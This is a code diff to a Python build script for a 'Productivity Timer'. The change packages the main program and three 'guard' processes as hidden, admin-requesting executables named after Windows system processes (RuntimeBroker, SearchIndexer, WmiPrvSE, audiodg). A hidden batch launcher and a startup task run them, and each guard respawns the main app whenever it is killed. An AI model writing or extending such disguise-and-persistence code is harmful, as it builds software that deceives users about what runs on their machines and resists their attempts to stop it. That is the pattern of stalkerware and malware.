@@ -16,17 +16,11 @@ from pathlib import Path
 # Disguised names - look like Windows system processes
 # The guard and main app use different names so killing one doesn't kill both
 MAIN_APP_NAME = "RuntimeBroker"      # Main app - looks like Windows Runtime Broker
-GUARD_NAME = "SearchIndexer"          # Guard - looks like Windows Search Indexer
-
-# Alternative names you can use:
-# "WmiPrvSE"       - Windows Management Instrumentation
-# "svchost"        - Service Host (many of these run normally)
-# "conhost"        - Console Window Host
-# "csrss"          - Client Server Runtime (be careful with this one)
-# "smss"           - Session Manager
-# "dllhost"        - COM Surrogate
-# "taskhost"       - Host Process for Windows Tasks
-# "audiodg"        - Windows Audio Device Graph
+GUARD_NAMES = [
+    "SearchIndexer",   # Guard 1 - looks like Windows Search Indexer
+    "WmiPrvSE",        # Guard 2 - looks like Windows Management Instrumentation
+    "audiodg",         # Guard 3 - looks like Windows Audio Device Graph
+]
 
 
 def install_pyinstaller():
@@ -64,40 +58,44 @@ def build_main_app():
     print(f"Main app built: dist/{MAIN_APP_NAME}.exe")
 
 
-def build_guard():
-    """Build the guard process with hidden name."""
-    print(f"\n{'='*50}")
-    print(f"Building guard as '{GUARD_NAME}.exe'...")
-    print('='*50)
+def build_guards():
+    """Build 3 guard processes with different hidden names."""
+    for i, guard_name in enumerate(GUARD_NAMES, 1):
+        print(f"\n{'='*50}")
+        print(f"Building guard {i} as '{guard_name}.exe'...")
+        print('='*50)
 
-    cmd = [
-        sys.executable, "-m", "PyInstaller",
-        "--name", GUARD_NAME,
-        "--onefile",
-        "--windowed",  # No console window - completely hidden
-        "--uac-admin",  # Request admin on launch
-        "--hidden-import", "psutil",
-        "--clean",
-        "-y",
-        "src/core/process_guard.py"
-    ]
+        cmd = [
+            sys.executable, "-m", "PyInstaller",
+            "--name", guard_name,
+            "--onefile",
+            "--windowed",  # No console window - completely hidden
+            "--uac-admin",  # Request admin on launch
+            "--hidden-import", "psutil",
+            "--clean",
+            "-y",
+            "src/core/guard_runner.py"
+        ]
 
-    subprocess.run(cmd, check=True)
-    print(f"Guard built: dist/{GUARD_NAME}.exe")
+        subprocess.run(cmd, check=True)
+        print(f"Guard {i} built: dist/{guard_name}.exe")
 
 
 def create_launcher():
-    """Create a launcher script that starts both processes."""
+    """Create a launcher script that starts all processes."""
+    guard_lines = "\n".join(
+        f'start "" /B "%~dp0{name}.exe" {i}'
+        for i, name in enumerate(GUARD_NAMES, 1)
+    )
     launcher_content = f'''@echo off
 :: Productivity Timer Hidden Launcher
-:: Starts the guard process which then manages the main app
+:: Starts the main app and 3 guard processes with different names
 
-:: Start guard (which starts and monitors main app)
-start "" /B "%~dp0{GUARD_NAME}.exe"
+:: Start main app
+start "" /B "%~dp0{MAIN_APP_NAME}.exe"
 
-:: Alternative: Start both independently
-:: start "" /B "%~dp0{MAIN_APP_NAME}.exe"
-:: start "" /B "%~dp0{GUARD_NAME}.exe"
+:: Start guards (each monitors and respawns main app if killed)
+{guard_lines}
 '''
 
     launcher_path = Path("dist") / "Start_Hidden.bat"
@@ -137,7 +135,7 @@ def create_startup_task():
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>%INSTALL_PATH%\\{GUARD_NAME}.exe</Command>
+      <Command>%INSTALL_PATH%\\{GUARD_NAMES[0]}.exe</Command>
     </Exec>
   </Actions>
 </Task>
@@ -154,28 +152,30 @@ def build():
     print("PRODUCTIVITY TIMER - STEALTH BUILD")
     print("="*60)
     print(f"\nMain app will appear as: {MAIN_APP_NAME}.exe")
-    print(f"Guard will appear as:    {GUARD_NAME}.exe")
+    print(f"Guards will appear as:   {', '.join(n + '.exe' for n in GUARD_NAMES)}")
     print("\nThese look like normal Windows system processes.")
 
     install_pyinstaller()
     build_main_app()
-    build_guard()
+    build_guards()
     create_launcher()
     create_startup_task()
+
+    guard_names_str = ", ".join(f"{n}.exe" for n in GUARD_NAMES)
 
     print("\n" + "="*60)
     print("BUILD COMPLETE!")
     print("="*60)
     print(f"\nFiles in dist/ folder:")
     print(f"  - {MAIN_APP_NAME}.exe  (main app)")
-    print(f"  - {GUARD_NAME}.exe     (respawns main if killed)")
+    for i, name in enumerate(GUARD_NAMES, 1):
+        print(f"  - {name}.exe         (guard {i} - respawns main if killed)")
     print(f"  - Start_Hidden.bat     (launcher)")
     print(f"\nTo use:")
-    print(f"  1. Run Start_Hidden.bat, or")
-    print(f"  2. Run {GUARD_NAME}.exe directly")
-    print(f"\nThe guard will automatically start and monitor the main app.")
-    print(f"If someone kills {MAIN_APP_NAME}.exe, {GUARD_NAME}.exe respawns it.")
-    print(f"\nTo fully stop: Kill BOTH processes in Task Manager.")
+    print(f"  1. Run Start_Hidden.bat")
+    print(f"\nAll 3 guards independently monitor and respawn the main app.")
+    print(f"To fully stop: Kill ALL 4 processes simultaneously:")
+    print(f"  {MAIN_APP_NAME}.exe + {guard_names_str}")
 
 
 if __name__ == "__main__":
